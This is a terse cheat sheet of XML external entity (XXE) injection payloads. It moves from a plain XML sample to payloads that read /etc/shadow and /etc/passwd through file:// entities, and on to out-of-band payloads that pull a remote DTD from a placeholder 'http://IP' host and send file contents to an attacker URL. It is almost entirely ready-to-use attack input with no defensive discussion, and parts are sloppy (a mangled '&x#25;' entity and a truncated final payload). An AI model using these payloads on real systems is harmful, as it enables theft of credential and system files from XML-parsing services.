<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <title>XML Example</title>
  </head>
  <body>
    <userInfo>
      <firstName>Rahul</firstName>
      <lastName>Jain</lastName>
    </userInfo>
  </body>
</html>








XXE: Basic XML Example

<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>Rahul</firstName>
 <lastName>Jain</lastName>
</userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Entity Example

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY test "Doe"> ]>
 <userInfo>
  <firstName>Rahul</firstName>
  <lastName>&test;</lastName>
 </userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: File Disclosure

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY test SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>Rahul</firstName>
 <lastName>&test;</lastName>
</userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Local File Inclusion Example

<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE reset [
	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
	%remote;
	%int;
	%trick; ]>

----------------------------------------------------------------------------------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
	%remote;
	%intern;
	%xxe; 
	]>

----------------------------------------------------------------------------------------------------------------------------------------------------------

Payload Using DTD File 

	<!ENTITY % a SYSTEM 'file:///etc/passwd'>
	<!ENTITY % b "<!ENTITY &x#25; c SYSTEM 'ur website/cookie=?%a;'> " > 
	%b;
	%c;
	
to call this  

<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
	%remote;

----------------------------------------------------------------------------------------------------------------------------------------------------------
